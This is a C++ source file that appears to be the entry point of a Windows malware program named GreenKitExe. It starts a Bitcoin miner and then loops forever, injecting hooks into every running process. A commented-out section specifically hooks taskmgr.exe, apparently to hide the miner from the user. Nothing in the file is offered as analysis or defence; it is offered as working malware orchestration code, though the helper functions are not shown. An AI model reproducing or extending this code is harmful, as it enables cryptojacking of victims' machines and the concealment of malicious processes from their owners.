// GreenKitExe.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "GreenKitExe.h"
#include "BitcoinMiner.h"
#include "process.h"
#include "Injector.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>


// Global Variables:
HINSTANCE hInst;								// current instance

// Forward declarations of functions included in this code module:
//ATOM				MyRegisterClass(HINSTANCE hInstance); *** KEPT ONLY AS EXAMPLE ***

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	hInst = hInstance;

    StartMiner();

	while (TRUE) {
		process_allSuspendApplyResume(HookProcess);
		Sleep(1000);
	}
    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5384);
    /*PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "taskmgr.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

                HookProcess(hProcess);
                CloseHandle(hProcess);
            }
        }
    }*/
}